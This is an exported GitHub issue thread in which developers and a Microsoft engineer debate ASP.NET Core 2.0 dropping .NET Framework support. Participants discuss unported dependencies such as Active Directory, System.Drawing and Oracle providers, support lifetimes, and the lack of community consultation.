374	"@gulbanana Can you describe the parts of the system that use ASP.NET Core why they need to be in the same process as .NET Framework. I appreciate the list (Visual Studio plugings, office interop etc) but are you embedded ASP.NET Core in all of those places today (I don't have a good picture from the above description)?

Also what were you using before ASP.NET Core existed? Or is this just a new endeavor that never used ASP.NET but took a 5-10 year bet on ASP.NET Core on .NET Framework being a thing? Did you look at Katana?
"
375	"OK, here are some specific case studies. I'll say up front that I'm sure a lot of these *could* be handled by running the desktop-specific work in a separate process, though it seems like a huge hassle to basically turn a bunch of interface implementations into RPC. It's not like we can just use remoting or binary serialization between core and desktop CLRs, either..

NTLM/AD
-------
For Single Sign On purposes we have apps which rely on the browser passing Windows login credentials through to IIS, which passes them on to an ASP.NET Core website. Part of the authentication process is then looking up information like whether the user is in a particular AD group. I'd really like to hear more about the ""windows support pack"" and whether it's intended to cover things like this.

System.Drawing
--------------
This is used in a webapp which creates thumbnails and basic image edits (rotation, watermark overlay). Many of the images being used date back to the time of dinosaurs, so there are things like TIFF in there. They're data maintained by a government department relating to particular property listings and land management. In this case the application was initially ASP.NET MVC, and got upgraded/rewritten through MVC 2, 4, 5 and now Core.

VSIX
----
This is a case of embedding A.N-C in netfx instead of the other way around. We have Visual Studio extensions for code generation which run 'templates' for various RAD scenarios. Some of these templates were created for web development and refer to A.N-C types at design time (they're created using preprocessor/runtime T4).

Crypto
------
This one really does have to be in-proc I think - we have licensing scenarios where the code is very security-sensitive. Broadly speaking, it's decrypting and verifying license files with respect to the environment the code is running in - this is a common library used in the backend of webapps as well as desktop apps. Eventually .NET Core seems likely to get enough crypto support that this one can be ported, but it hasn't today. For example, we one option we have today is Fortinet/ePass2003 PKI token support, where their middleware definitely does not support Core (and there's no timeframe for doing so).

Oracle ADO.NET
--------------
Using Entity Framework 6 with an Oracle backend doesn't *have* to be in-proc but it sure would be inconvenient for our websites to add an extra tier just to get to a database! 

WPF Interop
-----------
We use Microsoft.Extensions.Logging in all our desktop applications these days- the logging abstractions themselves will need to be in-proc, even if implementations aren't."
376	"As for what we used before ASP.NET Core - ASP.NET MVC! We could go back but it would be a great shame to give up all the benefits.

As an architect it's my screwup to have not looked into whether ""ASP.NET Core runs on full framework"" would persist beyond the first version. It honestly never occurred to me that it wouldn't. I just didn't imagine the possibility that as early as 2018 there might e.g. be no supported version which could load Office documents..."
377	"One thing I'm not clear about is where ASP.NET Core is used in each of those scenarios you mention. 

> NTLM/AD

This one makes sense and I'd like to understand what APIs that ends up mapping to. Is this just System.DirectoryServices? That one is actively being worked on (you can see it in corefx).

> System.Drawing

This is a known gap that we're looking at addressing. I don't have any answers here yet and I won't suggest rewriting using ImageSharp (though that is an option). This will need to be addressed.

> VSIX

Where's the ASP.NET Core here? Is it running inside of a visual studio extension?

> Crypto

Is there a corefx issue for this one? Why wouldn't it just be ported? Unlike .NET Framework, .NET Core releases are decoupled from the OS so it's possible that this could happen sooner rather than later if deemed important. (Disclaimer: I don't know enough about crypto to understand the implications of doing this cross platform).

> Oracle ADO.NET

Where does ASP.NET Core come in here? Are you just saying the Oracle provider hasn't been ported to .NET Core yet?

> We use Microsoft.Extensions.Logging in all our desktop applications these days- the logging abstractions themselves will need to be in-proc, even if implementations aren't.

Microsoft.Extensions.* will remain netstandard so you're covered there."
378	"Why no announcement/discussion?
I love what aspnet/.net core team do, but I have the same fears as @jhurdlow."
379	"Glad to hear about M.E.L. On the other points-

> NTLM

Here's one class which is used in most of our applications. It makes pretty trivial use of the API, stuff which hopefully *could* be ported in theory (but hasn't been).
https://gist.github.com/gulbanana/70fe791735ee884169e2eee354a32ad2

> VSIX

The codegen templates specific to asp.net core use the action/routing system (IFileProvider etc) to discover controllers and views etc and fill in our scaffolding. We're not hosting an ASP.NET webhost inside of visual studio, just introspecting over ASP.NET applications.

> Crypto

I suspect the algorithms we use *will* be ported, but they haven't been yet. This would all look a lot different if the premise was, like, an announcement of a long-term plan to drop support for asp.net-core-on-netfx and discussion of when that might be possible!

> Oracle

Yep, this would be resolved if an Oracle port happens (assuming it's full-featured and so on). "
380	"One more use case:
One of our applications imports legacy data from an Access application. Right now that import process runs on a server in an asp.net core website. It uses COM interop to load `acedao.dll` from the accdb/jet engine redistributable, reads tables into our entity abstractions, then saves them into a more modern SQL database.

This is another case of 'could be out of proc, but why should it have to be'. We'd essentially be using A.N-C as a frontend to a WebAPI 2 website or something, in which case we've gone back to that dependency on the past :(

Overall our goal is to move the vast majority of what we do to .NET Core. We would like as much interop as possible for as long as possible *while* we move things over..."
381	"WTF !!!  😨 
Are you saying that ASP.NET Core 2 will not target Full .NET framework 4.x anymore !!!
We just starting a project 1 month ago with ASP.NET Core 1.1 and we targeted .NET 4.6 because we reference some Full .NET Lib. And we were going to upgrade to ASP.NET Core 2. But what I'm hearing from this post... 😞 
Look, we chose ASP.NET Core because of its benefits (DI, merged API and MVC, ... powerful), so, please give as a change dude."
382	"> We just starting a project 1 month ago with ASP.NET Core 1.1 and we targeted .NET 4.6 because we reference some Full .NET Lib

What do those libraries do? Did you read @shanselman 's initial reply https://github.com/aspnet/Home/issues/2022#issuecomment-299536123? It's possible to reference some .NET Framework libraries in .NET Core 2.0 (assuming they stay within the subset of APIs)."
383	"> What do those libraries do? Did you read @shanselman 's initial reply #2022 (comment)? It's possible to reference some .NET Framework libraries in .NET Core 2.0 (assuming they stay within the subset of APIs).

@davidfowl yes I read @shanselman 's comment, we use some Libs made by company some of those lib uses WCF, all those Libs are stable, they target .NET 3.5, and we cant touch them."
384	This is going to be a very common situation. I'd love to know whether any information has been gathered (telemetry?) on just how many users of ASP.NET Core are on .NET Core vs .NET Framework so far.
385	"I am personally not emotional about this, but some observations:

* most customers I have today use the asp.net core 1.x/full framework combination because they are scared to go all-in on the new stuff
* telling from the nuget package download numbers, adoption of asp.net core is not great. With that move it will be even a bit harder to sell something that doesn't sell well right now.
* it is great that you have identified the LDAP stuff to be a gap (I think I never seen anyone in the last 10 years using those libraries but maybe that's just me). The bigger issue will be 3rd party libs. These will be the real reasons why people will not move to .net core

This whole situation is again another good example of MS just making a decision without any heads up. Only because some people follow the check-ins, this thread here exists.

I might be wrong, but I thought .NET Core is now under governance of the DNF - so these decisions are not purely MS internal anymore.
"
386	"The LDAP/AD stuff is definitely a reason why I need to stay on top of net462 right now. I'd love to completely go, BAM -> NetCore completely, but this is a drawback. 

I'm also using XML-RPC.net in one of my projects. It uses some serious Reflection.Emit in it, and I'm not sure whether NetCore 2 will support it completely. I'll have to try the Portability Analyzer to see for sure, though."
387	"I find this whole situation a bit disheartening with just how quickly and easily an important decision like this which affects the future of .NET can happen without any transparency, at the last minute, yet again. Lots of energy has been invested in selling the existing .NET ecosystem on migrating to ASP.NET Core with the messaging (from my understanding) being that .NET Standard 2.0 will focus on compatibility and will be the release that bridges the gap with .NET v4.x to finally produce a solid, stable .NET platform the ecosystem can finally depend upon. I personally don't believe .NET Core will really take off until after .NET Standard 2.0 is released as I anticipated it to be the ""promised stable land"" we're all waiting for - now I have no idea what "".NET Standard 2.0"" means, what exactly it's going to cover and which libraries are planned to be .NET Core only.

As there has been no prior official announcement, request for feedback, polling or rationale given, this decision ""appears"" to be have been done with zero community involvement or impact analysis to the existing .NET ecosystem and will likely fragment the entire ecosystem for many years to come. Removing .NET v4.x support removes a smooth migration path for many enterprises to be able to migrate their existing code-bases to ASP.NET's new development model. This won't encourage them to jump to .NET Core faster, it effectively prevents them from even attempting to, causing a massive fragmentation that will fracture the .NET ecosystem in two. I don't see how this will end up being any different than Python 2/3 which has been irreparably harmed by the fragmentation which it still hasn't been able to recover from in nearly a decade.

Most existing .NET code-bases are brownfield being developed behind-the-scenes by ""dark matter"" .NET developers, most of which won't have any idea that this decision was made given .NET Core 1.1 supports .NET v4.x and the messaging for .NET Standard 2.0 was the promise of improved compatibility. I'm expecting a massive backlash once the news and impact of this decision finally hits home. Many devs who have been selling adoption of .NET Core internally within their organization are going to feel betrayed given they've effectively have been migrating to a dead-end platform (if they're unable to fully migrate to .NET Core for whatever reason) a harsh reality they'll need to face just after they've succeeded in the monumental decision of convincing stakeholders in their organization to approve the resources required for their current migration. 

Most organizations need to migrate their existing code-bases ""in-flight"" where they need to continuously deploy their existing systems whilst migrating their code-base ""in parallel"" which are going to want to deploy to .NET v4.x first, then after everything has stabilized and all issues have been ironed out they can then plan on a full migration to .NET Core from there.

This decision is also being made in the context of years of breaking changes to ASP.NET which IMO have eroded the trust that .NET is a stable platform that organizations can depend on. I love .NET Core's new development model, but IMO what we need most is a stable platform we can depend upon that the rest of the ecosystem can catch up to. .NET Core is still in uncanny valley, with immature tooling, incompatible dependencies, runtime issues, out of date documentation, etc - I haven't seen .NET this unstable since the early days when it was first released.

Why not run a poll on what .NET devs want more? i.e. a a solid, stable polished platform or a ""fast moving"" platform that delivers new features faster? I understand it would require a lot less effort to not have to worry about back-porting features to .NET v4.x but it would be invaluable to have a version of ASP.NET Core that focused primarily on delivering a stable compatible platform with long term support that can run on either .NET v4.x or .NET Core.

Has this ship sailed or is there an option to keep ASP.NET Core 2.0 as it is? i.e. with most libraries and abstractions covered by .NET Standard 2.0 and then in the next ASP.NET Core 3.0 release announce that the next platform will be .NET Core only? This will allow organizations to continue to move forward and adopt ASP.NET Core 2.0 and allow the rest of the ecosystem to catch up to, with stable and well supported tooling and libraries, whilst having a clean split from where .NET Core only platform/features start.

> It's possible to reference some .NET Framework libraries in .NET Core 2.0 (assuming they stay within the subset of APIs).

This breathes uncertainty, very few people are going to want to risk their reputation and the health and stability of their systems and attempt a full migration to .NET Core when uncertainty exists on exactly which of their dependencies will and will not be able to run on .NET Core, which means more people staying on .NET v4.x for the foreseeable future.

I don't really know how this will ultimately play out and what the true impact of this decision will have on the entire .NET ecosystem, but the fact that important decisions like this with broad impact can happen without any external community involvement is concerning.

"
388	"I wish you guys were a little less hell bent on bifurcating your user base.

My point of view when creating a library is to make it easy to use as possible, for as many people as possible, in as many places as possible. It is a pain in the neck (search for `#if` compiler directives in Newtonsoft.Json and you get 1300+ results) but ""It just works"" is a powerful selling point."
389	"> Why not run a poll on what .NET devs want more? i.e. a a solid, stable polished platform or a ""fast moving"" platform that delivers new features faster? I understand it would require a lot less effort to not have to worry about back-porting features to .NET v4.x but it would be invaluable to have a version of ASP.NET Core that focused primarily on delivering a stable compatible platform with long term support that can run on either .NET v4.x or .NET Core.

Genuine question, ASP.NET Core 1.x currently supports .NET Framework and .NET Core. Lets say it was the stable platform you mention above, that we bug fix and support on both runtimes but didn't get more features. Would that be enough? 

ASP.NET Core and .NET Core are the fast moving feature rich platforms for .NET at this point. It's a version of .NET that isn't tied to any operating system and that gives us the agility needed to innovate rapidly and release faster.

> Has this ship sailed or is there an option to keep ASP.NET Core 2.0 as it is? i.e. with most libraries and abstractions covered by .NET Standard 2.0 and then in the next ASP.NET Core 3.0 release announce that the next platform will be .NET Core only? This will allow organizations to continue to move forward and adopt ASP.NET Core 2.0 and allow the rest of the ecosystem to catch up to, with stable and well supported tooling and libraries, whilst having a clean split from where .NET Core only platform/features start.

We're always open to feedback and ASP.NET Core 2.0 hasn't shipped yet. If ASP.NET Core 3.0 was the release that dropped .NET Framework would that make things better? If you look at some of the feedback from @gulbanana and @ikourfaln, there are technologies that are likely never to get ported and thus will never work on .NET Core, doesn't that mean supporting .NET Framework pretty much forever? Wouldn't we just have this same discussion a year from now? Maybe by then the ecosystem or libraries that support .NET Core would be bigger so it has less of an impact? What about those enterprise libraries that will never be updated (or where the source code was lost)? Will those change in a year?
"
390	"> My point of view when creating a library is to make it easy to use as possible, for as many people as possible, in as many places as possible. It is a pain in the neck (search for #if compiler directives in Newtonsoft.Json and you get 1300+ results) but ""It just works"" is a powerful selling point.

No offense @JamesNK but JSON.NET is a JSON parser and for the most part a single package (I know there are a few more). ASP.NET Core has > 200 packages."
391	No offense but I'm one guy working part time. Your problem is harder but you have exponentially more resources.
392	"After reading through this and looking through the dependencies we have, I'm far less convinced this is a good idea.

As plans stand, we can't port any of our apps over to `netstandard`/`netcoreapp` until `System.DirectoryServices` is available ([CoreFX issue #2089 here](https://github.com/dotnet/corefx/issues/2089)). So while we can port to ASP.NET Core 1.x, we can't go to 2.0. Looking at the applications here: Opserver, Stack Overflow itself, our internal apps...nothing would be ready as 2.0 is pitched to be at this point. According to the standup this week, critical things like DirectoryServices would still follow in a 2.x later release.

So between 1.0 and 2.0 it's changed from something I was preparing to move to, into something I can't go to. So yeah, I'd say it's not ready. ASP.NET is a way to expose the bits I need over HTTP. ASP.NET Is not the thing I need in itself. I'm not using .NET *just* for the web bits, I'm using it for the platform...as are a great many people. The platform is not ready for the wide variety of use cases users demand, so forcing users onto that platform causes pain and blockers.

The bottom line is that if we need AD auth (a *huge* part of the platform), we've just been abandoned on the 1.x line. That's where I was headed with our apps...but if this is the direction then there's no point is putting in effort here until the bits I need are available at the destination.

If we can say these critical things like `System.DirectoryServices`, `System.Drawing`, and the other top items people need will be ready **with** ASP.NET Core 2.0, my opinion changes a lot. If they're an afterthought (as current schedules show), please continue supporting the .NET Framework until they are.

Moving fast is great. I love it. I'm running alphas in production right now. But none of that matters if it doesn't work for your use case in the first place."
393	"One thing I'm personally struggling with is the ""stable platform"" vs ""new features"" thing. On one hand, we want the platform to be stable and reliable and compatible, on the other hand nobody wants to stay on 1.x because it's doesn't have 2.x features. Are there super compelling features in ASP.NET Core 2.x that are pulling people in that direction or is it just the fact that we have more features than we had in 1.x (because it's new and shiny)? 

If it's the latter, then do those people care about stability? If the answer is yes, then why isn't ASP.NET Core 1.x sufficient?

> I'm not using .NET just for the web bits, I'm using it for the platform...as are a great many people. The platform is not ready for the wide variety of use cases users demand, so forcing users onto that platform causes pain and blockers.

Agreed, but in your opinion, how does that relate to ASP.NET Core 2.x dropping .NET Framework support? When more dependencies come online, they'll work every where so in a sense, as the platform moves forward the broad set of runtimes will get the benefits. All versions of ASP.NET Core   applications would suddenly be able to take advantage of of those features."
394	">If it's the latter, then do those people care about stability? If the answer is yes, then why isn't ASP.NET Core 1.x sufficient?

Everyone always wants new features, the possibility of new features, or at least knowing that they'll have the option to get more goodies sometime later. When you close off a platform and put it in ""stable""/""maintenance mode, people see that as no longer being paid attention to.


"
395	"> Are there super compelling features in ASP.NET Core 2.x that are pulling people in that direction or is it just the fact that we have more features than we had in 1.x (because it's new and shiny)?

Support - that's what we're paying for.

> If the answer is yes, then why isn't ASP.NET Core 1.x sufficient?

Because support ends just about a year after release (according to Scott above). And I may barely be done porting Stack Overflow by then.

> how does that relate to ASP.NET Core 2.x dropping .NET Framework support?

Because libraries I **have to have** aren't there. And I don't know when they will be. So I'd be stuck on 1.x and I have a time bomb until support ends. Will I have enough time to port from 1.0 to 2.x (or 3.x) before support ends? Probably not.

Large codebases can't just stop and port, they need time, it needs to happen in stages. Doing a .NET 4.6.x port onto ASP.NET Core was feasible as an intermediary step. Going to core at once is much harder, takes much longer, and requires longer-lived branches and more pain. If we can't do this in stages, I honestly just can't see us ever making the move off the the now-abandoned ASP.NET 5 line. There's no way I can justify the time, cost, and development impact it'll have.

I think many OSS authors are like myself as well - it's an extension of our day jobs. If we aren't using the platform or dogfooding it, the libraries are far worse off or don't get created. And we can't justify the time to maintain them with company hours that we spend today. And every library we make comes from a need we hit in production. The ecosystem dropping use cases has a lot of downstream impact that's not sudden, but still adds up.

Currently my view is this: there's a new platform that works until about July 2018. After that: I know nothing, I just *hope* what I need is available on `netstandard`/`netcoreapp` by then. And hope I have enough time to port before support ends. I'm not paid to hope though, I'm paid to make platform decisions for our company, and ASP.NET Core is a bad bet (for us) with this change and no date for a version that will work.

Let me offer a one-line summary: without .NET Full Framework support, ASP.NET Core does not offer a supported platform for our use cases for the next 2 years."
396	"As a short version, it's this:

Priority 1: This has to work on `net461`, no matter what ifdefs, perf there is.
Priority 2. If you can make it 10x faster on .NET Core 2.0, then that's awesome. It's a great reason for people to choose the platform and/or migrate when they can.

The key thing here is that for long term support, it still *has* to work on the full framework, even if it's slower there.
"
397	"> Priority 1: This has to work on net461

And if .NET Core was fully compat with net461 (within reason); so anything written for net461 worked on Core; would that then be ok? 

Basically, at that point you have a more stable platform than net4x as you can do side-by-side and self contained (touch of x-plat too). Whereas net461 has *whole* machine changes to 4.6.1, 4.6.2, 4.7 etc

Obviously somethings will never work; like partial trust - but that never worked anyway."
398	"> Genuine question, ASP.NET Core 1.x currently supports .NET Framework and .NET Core. Lets say it was the stable platform you mention above, that we bug fix and support on both runtimes but didn't get more features. Would that be enough?

I would love a to see a LTS release of ASP.NET Core 2.0 like Ubuntu / Redhat does with their LTS releases which they support for 5+ years. It would provide a solid compatible target that the rest of the ecosystem can have the confidence to commit to adopting. 

I'm personally more interested in a stable .NET Standard 2.0 more than any future .NET Core-only features as I would love to get back to .NET development where everything just works again, the tooling isn't broken, the popular .NET packages all provide support for, the surrounding deployment and hosting solutions are polished and there's plentiful docs, posts, videos and knowledge-base available for a stable ASP.NET Core we can start building solutions on.

> Wouldn't we just have this same discussion a year from now? Maybe by then the ecosystem or libraries that support .NET Core would be bigger so it has less of an impact? What about those enterprise libraries that will never be updated (or where the source code was lost)? Will those change in a year?

In an ideal world .NET v4.x and .NET Core would both support ASP.NET Core in the foreseeable future and it's only new .NET Core-only features which will only be available in .NET Core-only packages. But if MS is destined on leaving .NET 4.x behind then a ASP.NET 2.0 LTS release before you officially part ways would be the next best thing. By definition no-one is depending on new features that don't exist yet so no-one is going to be forced to upgrade to a .NET Core-only v3.0. 

With the freedom of only having to support 1 platform you could potentially deliver new features that would entice developers to adopt the next latest and greatest version with continual new stream of features, personally I'm happy with the functionality ASP.NET has now and so I'm  more interested in a stable version where everything's polished so I can go back to being productive again and focus on developing solutions on it instead of chasing an always moving platform.
"
399	"Firstly, thanks @davidfowl for jumping into the thread and standing up/asking questions, etc. When there's a heated community asking heaps of Q's, it's easy to not step in and avoid being 'a target'. So thanks for getting involved, constructively. /me salutes you.

---

I see two main points/threads coming out of this conversation:
1. Request to support .NET desktop in vnext. (that's 99% of the replies in here)
2. Lack of community consultation over such an important decision. (the 2 or 3 replies in here).

### TL;DR;
- Can we please be more open with big important vnext changes.
- Allocate some time for some RFC from the community about these vnext changes.

@mythz stated it nicely in his opening sentence to his (at this point), ~most recent~ 2nd most recent comment:

>I find this whole situation a bit disheartening with just how quickly and easily an important decision like this which affects the future of .NET can happen without any transparency, at the last minute, yet again.


This is what really hit me personally and I would love some official replies/comments from the appropriate folks at MS who make these calls plz. ""We"" have been around this community for a hella long time - familiar faces, familiar names and it's pretty fair to say - all following the same positive goals. I'd even go on to say ""we"" are a pretty large, extended family, warts-and-all.

So I feel that with the new direction MS has taken (OSS-all-the-things, etc) and with some recent mega-uber-.NET-threads in the last 12/18 months (read: learning from those community discussion experiences) ... that ""we"" are all in this together and that some of these Really-Big-Things ™️  would be discussed in the open, way ahead of time.

So - can we please have some of these big decisions talked about in the open, before hand? Get some positive community consultation and discussion?

Note: I do accept that this project(s) are not a democracy and that the _decisions_ are made by MS. No probs. I'm not criticizing _that_. I'm talking about the steps way prior to that. Also, I'm not asking for _everything_ to be put up for RFC, etc. Just the odd major ticket item - like what this thread has started."
400	"> But if MS is destined on leaving .NET 4.x behind then a ASP.NET 2.0 LTS release before you officially part ways would be the next best thing. By definition no-one is depending on new features that don't exist yet so no-one is going to be forced to upgrade to a .NET Core-only v3.0.

I don't understand. No one is depending on features in ASP.NET 2.0 yet either as they don't exist in a release. So isn't ASP.NET Core 1.x that version? It runs on full framework, core 1.0 and core 2.0 and can act as the stepping stone to ASP.NET Core 2.x?"
401	"@onovotny 

> Everyone always wants new features, the possibility of new features, or at least knowing that they'll have the option to get more goodies sometime later. When you close off a platform and put it in ""stable""/""maintenance mode, people see that as no longer being paid attention to.

Yes but it's really hard to guarantee the same level of quality when .NET Framework is the big stable supported tied to the OS component. As @terrajobst said, some things will definitely be ported at some point but others will need to be figured out. The fact is, ASP.NET Core runs best on .NET Core because we have the ability to rev the entire stack all at once. So far, there are big performance differences between the 2 runtimes and we've yet to take dependencies on new APIs because of .NET Framework support. As we move forward, we will be adding new APIs that may or may not appear on .NET Framework at some point and we don't want to rev at the pace of the most stable and slowest moving runtime (.NET Framework).

@NickCraver

> Because support ends just about a year after release (according to Scott above). And I may barely be done porting Stack Overflow by then.

I'm not sure that's entirely accurate. When 2.0 is available 1.1 will still be supported. So what is this ""support"" you're talking about? Do you mean paid support or do you mean that we'll fix issues when they come up?

> Because libraries I have to have aren't there. And I don't know when they will be. So I'd be stuck on 1.x and I have a time bomb until support ends. Will I have enough time to port from 1.0 to 2.x (or 3.x) before support ends? Probably not.

Like I said though, those libraries will light up irregardless of the .NET Core version. I think what you're saying is that you want to use the latest version of ASP.NET Core (whatever that is) and you want it to be supported on .NET Framework until there are enough libraries on .NET Core so that the port is easy for you specific scenario.

> Large codebases can't just stop and port, they need time, it needs to happen in stages. Doing a .NET 4.6.x port onto ASP.NET Core was feasible as an intermediary step. Going to core at once is much harder, takes much longer, and requires longer-lived branches and more pain. If we can't do this in stages, I honestly just can't see us ever making the move off the the now-abandoned ASP.NET 5 line. There's no way I can justify the time, cost, and development impact it'll have.

How does ASP.NET Core revving versions affect that? If we dropped .NET Framework support in 3.0 (as people seem to be eluding to in this thread), wouldn't you be in that same dead end regardless? You'd have your ASP.NET Core 2.0 application ported running on framework for a year and when 3.0 comes out, you'd be unable to upgrade. You would be able to do this anyway with ASP.NET Core 1.1.x which runs on .NET Framework and *is* supported even when ASP.NET Core 2.0 is out. 

> Currently my view is this: there's a new platform that works until about July 2018. After that: I know nothing, I just hope what I need is available on netstandard/netcoreapp by then. And hope I have enough time to port before support ends. I'm not paid to hope though, I'm paid to make platform decisions for our company, and ASP.NET Core is a bad bet (for us) with this change and no date for a version that will work.

So one more year is enough time for everyone? That's not the feeling I'm getting from this thread. "
402	"> Priority 1: This has to work on net461, no matter what ifdefs, perf there is.
Priority 2. If you can make it 10x faster on .NET Core 2.0, then that's awesome. It's a great reason for people to choose the platform and/or migrate when they can.

> The key thing here is that for long term support, it still has to work on the full framework, even if it's slower there.


The only reason .NET Framework works as well as it does today is because we were intentional about supporting it. It didn't come for free, it's not ""just faster on core"", we had to intentionally design the system so that it was possible to make it work on .NET Framework. Even though you don't see it yet, the feature gap will grow between the 2 once we decide (and we've decided) to take dependencies on APIs that don't exist in .NET Framework as yet. We can do what @PinpointTownes says and start throwing `NotSupportedException` when those feature gaps appear but IMO that's a pretty bad experience."
403	"We spent a large development budget on porting our ASP.net MVC5 app to ASP.net core full framework to make it work nice with Azure Service Fabric. The whole project was multi-month in which there were several weeks dedicated to porting our web application (and frankly, wrestling with the awkward VS2015 tooling). 

The only reason that worked was because full framework was supported, since we're currently running SignalR on ASP.net core (to @davidfowl discouragement). As far as I can tell, SignalR still isn't supported on Asp.net Core?

Then we spent a week or so migrating to the new VS2017 tooling. Fine.

**_Note that up to this point there are no improvements to the product at all, it's just adjusting code shape to fit into Microsofts platform and tooling requirements._**

Now you're telling me that within 12 months I'll have to perform more featureless development effort with no guarantee that I'll even be able to do it, depending on a bunch of hand waving and should be able to's? No thanks.

First, get everything Microsoft branded that people are using in ASP.net core full framework today working on ASP.net core only. Second, find out what else (if anything) would be blocking the ecosystem from adopting ASP.net core as desired. Then, and only then, drop support for Netfx as is being discussed."
404	"> We can do what @PinpointTownes says and start throwing NotSupportedException when those feature gaps appear but IMO that's a pretty bad experience.

That's not exactly what I said: when going with cross-compilation, `ifdefs` should definitely be the preferred option to exclude APIs unavailable on a specific platform, but if for whatever reason you absolutely **MUST** have this API signature in the public contract, then you can go with `NotSupportedException`."
405	"> I don't understand. No one is depending on features in ASP.NET 2.0 yet either

I'm expecting most devs are waiting for a stable and highly compatible .NET Standard 2.0 that their dependencies are supporting before they commit to migrating to ASP.NET Core. They're not going to want to adopt .NET Core 1.1 now knowing it's been EOL'ed and MS doesn't have a good history of providing long term support for any old DNX/.NET Core version. If there was a highly compatible stable LTS release that the rest of the ecosystem can safely adopt, enterprises should have everything they need to run their systems on it and they wont feel obliged to upgrade to .NET Core vNext as they'll have everything they need on v2.0 and when the time comes it will be a lot easier to plan their migration from ASP.NET Core 2.0/.NET v4.6 to a future .NET Core only version."
406	"@mythz 

> I'm personally more interested in a stable .NET Standard 2.0 more than any future .NET Core-only features as I would love to get back to .NET development where everything just works again, the tooling isn't broken, the popular .NET packages all provide support for, the surrounding deployment and hosting solutions are polished and there's plentiful docs, posts, videos and knowledge-base available for a stable ASP.NET Core we can start building solutions on.

Agreed with everything there but I don't see how this decision affects anything you said. I want all of those same things 👍 .

> With the freedom of only having to support 1 platform you could potentially deliver new features that would entice developers to adopt the next latest and greatest version with continual new stream of features, personally I'm happy with the functionality ASP.NET has now and so I'm more interested in a stable version where everything's polished so I can go back to being productive again and focus on developing solutions on it instead of chasing an always moving platform.
 
Right, isn't that ASP.NET Core 1.x? If support was extended on 1.x wouldn't that be enough? We could just make sure that ASP.NET Core 1. which is netstandard 1.x runs on .NET Core 2.0 (which it already does) and support that for say another year or so.
"
407	"> That's not exactly what I said: when going with cross-compilation, ifdefs should definitely be the preferred option to exclude APIs unavailable on a specific platform, but if for whatever reason you need to have this API signature in the public contract, then you can go with NotSupportedException.

I'm not even talking about exposing public API. I'm talking about APIs we need to call that won't exist in netstandard. #ifdefs don't help here. We would just throw as the gaps increase."
408	"@davidfowl Totally valid questions - answers:
> Do you mean paid support or do you mean that we'll fix issues when they come up?

Active fixes for issues - will 1.x receive fixes for all the things we break, or will we be told to upgrade for a fix in some cases? (note: that's an upgrade we can't do until our libraries like DirectoryServices are there...and *even if we can* it's nowhere close to a free or even cheap, it's likely months at a minimum). We're big, we're fast, we will find breaks in the framework. We have for every major and minor release for years. Support is critical to us.

> I think what you're saying is that you want to use the latest version of ASP.NET Core

Nope, I want *a* version that works and a path forward. With 1.x, we only have the first half. Until this issue, the second was kind of assumed.

> How does ASP.NET Core revving versions affect that?

Because if you're dropping support for full framework, we're forced to make a major change to stay in support.

> If we dropped .NET Framework support in 3.0 (as people seem to be eluding to in this thread), wouldn't you be in that same dead end regardless? 

Maybe? The point is having parity in use cases before making the dive. It's my career, I can't tell our company to jump when the other side may not support us. That'd just be irresponsible on my part. If our use cases were supported in the 2.x timeframe, then there's a clear path forward and it's far safer to make bets on ASP.NET Core.

> So one more year is enough time for everyone? 

The *absolute* length of time doesn't really matter - it needs to be use-case compatability + time (IMO). If our use cases worked today (e.g. AD auth), then 2 years is enough, yes. But currently that's not the case, so agreeing that an arbitrary point in time from now is okay is, at best, premature.

> It didn't come for free, it's not ""just faster on core"", we had to intentionally design the system so that it was possible to make it work on .NET Framework. Even though you don't see it yet, the feature gap will grow between the 2 once we decide (and we've decided) to take dependencies on APIs that don't exist in .NET Framework as yet.

Then no offense, but why not just say that and close the issue? That statement seems like there's nothing more to discuss, and our time is better spent elsewhere. If that's not the case, please clarify?

The main problem is we can't port our workloads to `netstandard` *today*, or, as currently proposed, at launch. If what we *already have* doesn't work, why would we care about new features? The team keeps talking about performance (and that's awesome, really), but something I can't use running fast really doesn't matter much.

As an architecture/platform lead, I have to decide what bets we make. Currently, this is a bad bet. When version 1 supports you but version 2 doesn't but *hopefully will someday*, that's a really bad gamble to make with other people's time and money. At least for us, we chose .NET for the features, ecosystem, and support. Currently, in the new word we've gone from all 3 of those to 1. The ecosystem isn't there yet (API surface, libs), and support is far shorter than we're used to, without any guaranteed upgrade path and an unknown amount of time to do so."
409	"@jahmai

> The only reason that worked was because full framework was supported, since we're currently running SignalR on ASP.net core (to @davidfowl discouragement). As far as I can tell, SignalR still isn't supported on Asp.net Core?

Even the SignalR 2 isn't supported on ASP.NET Core (though people have hack it to make it work). SignalR is still under development and won't even be out with ASP.NET Core 2.0, it's coming later.

> Now you're telling me that within 12 months I'll have to perform more featureless development effort with no guarantee that I'll even be able to do it, depending on a bunch of hand waving and should be able to's? No thanks.

Are there features you need in ASP.NET Core 2.0? Or are you just speculating that eventually you'll need to upgrade to the next ASP.NET Core and at that point things won't work on .NET Framework?

> First, get everything Microsoft branded that people are using in ASP.net core full framework today working on ASP.net core only. Second, find out what else (if anything) would be blocking the ecosystem from adopting ASP.net core as desired. Then, and only then, drop support for Netfx as is being discussed.

As part of netstandard 2.0 lots of work was done identifying important APIs to bring back so that libraries that targeted .NET Framework were for the most part binary compatible with it. Of course there are areas that just won't work like WCF, WPF etc. but it will help as we did some research and ~60% of the libraries are API compatible with netstandard 2.0 (correct me if I'm wrong on that number @terrajobst) and may just work on .NET Core 2.0.

"
410	"> Right, isn't that ASP.NET Core 1.x? If support was extended on 1.x wouldn't that be enough? 

I expected .NET Standard 2.0 was going to be the stable platform which bridges compatibility with .NET 4.x so it makes more sense LTS support will be around that. No-one is expecting 1.1/.NET v4.x to be EOL'ed mid-release so it would be respectful to announce LTS on the latest version when it's released, not pulling .NET 4.x support before it's released, no-one does LTS in retrospective to old versions like that.

I know we're maintaining our .NET Core packages in a separate `*.Core` packages so we can remain on a separate release cadence that follows the latest .NET Core version as the moment we merge into the main NuGet packages it means we're committing to a stable release that we're going to officially support, so we need to be highly confident we have a version we can support for the foreseeable future which I expected from .NET Standard 2.0, not the current .NET Standard 1.1/1.3/1.6 mix. I remember there was also a time where there was going to be a 1.7/8 stop gap release that was going to be incompatible with 2.0 breaking the .NET Standard versioning expectation which aren't signals of a stable platform. 

I've been anxiously expecting .NET Standard 2.0 was destined to provide the much sought after highly compatible surface area and much needed stability.
"
411	"> Even the SignalR 2 isn't supported on ASP.NET Core (though people have hack it to make it work). SignalR is still under development and won't even be out with ASP.NET Core 2.0, it's coming later.

Not sure how you intended that statement, but I feel it just reinforces my concerns.

